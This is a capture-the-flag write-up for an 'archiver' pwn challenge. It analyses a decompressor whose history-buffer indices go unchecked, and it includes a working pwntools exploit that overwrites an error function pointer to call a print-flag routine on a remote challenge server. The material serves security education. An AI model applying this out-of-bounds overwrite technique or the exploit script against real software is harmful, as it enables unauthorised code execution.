## archiver

We are provided with a 64-bit Linux ELF binary and a Python wrapper script. The wrapper reads the input from stdin, writes it to a file, then calls the binary with the file's path. It explicitly closes stdin and redirects stdout to a pipe when calling the binary, which would prevent a trivial shell such as the one gadget addresses.

From the name of the challenge, the binary probably implements some sort of compression algorithm. We were not disappointed, and based on previous experience expected there to be a bug involving decompression and a history buffer.

The core decompression function is at 0x16D0. It reads a 64-bit magic value and 64-bit decompressed size. Then it reads 1 byte, the top 2 bits indicate the block type (e.g. literal, copy to history, copy from history, zeros) and the bottom 6 bits are a type-specific value.

 - Literal: copy N 64-bit blocks from input to output
 - Copy to history: read 1 byte B from input, copy a 64-bit block from ```output buffer - 8 * B``` to ```history buffer + 8 * N```
 - Copy from histoiry: copy a 64-bit block from ```history buffer + 8 * N``` to output buffer
 - Zeros: write N 64-bit blocks of zero to output

While analyzing these operations, neither copy to history nor copy from history validate that the index into the history buffer. This index can be as large as 63 (0x3f), yet the history buffer is only 48 blocks. This allows us to overwrite past the history buffer in the Compress class:

```
00000000 Compress        struc ; (sizeof=0x1B8, align=0x8, mappedto_12)
00000000 vtbl            dq ?                    ; offset
00000008 file_manager    dq ?                    ; offset
00000010 history_buf     dq 48 dup(?)
00000190 outbuf          dq ?                    ; offset
00000198 outbuf_size     dq ?
000001A0 outidx          dq ?
000001A8 uncomp_size     dq ?                   
000001B0 error_func      dq ?                    ; offset
000001B8 Compress        ends
```

It is obvious from the placement of the function pointer after the history buffer, and the fact that it exists at all, that we need to overwrite it using the out-of-bounds write vulnerability. However, due to ASLR and PIE we do not know what to write there.

Eventually we noticed that the binary contains a convenient function to print the flag at 0x1320, and also conveniently the error function pointer points to 0x1160 which is before the print flag function. We can turn the decompressor into a simple adder by moving the function pointer into uncomp\_size using the OOB read and write, add N*8 to uncomp\_size by decompressing N blocks, and then move the value from uncomp\_size to the function pointer using the OOB read and write.

```
#!/usr/bin/env python
from pwn import *

data = ''.join([
    p64(0x393130322394D3C0),
    p64(0x1000000),

    # copy error func to uncomp output size
    p8(0xC0 | 52),
    p8(0x40 | 51), p8(1),

    # increment uncomp output size -> cat flag
    p8(0x80 | 56),

    # copy cat flag to error func
    p8(0xC0 | 51),
    p8(0x40 | 52), p8(1),

    # trigger error func
    p8(0x40), p8(0xff),
])

r = remote('110.10.147.111', 4141)
r.send(p32(len(data)) + data)
r.interactive()
```
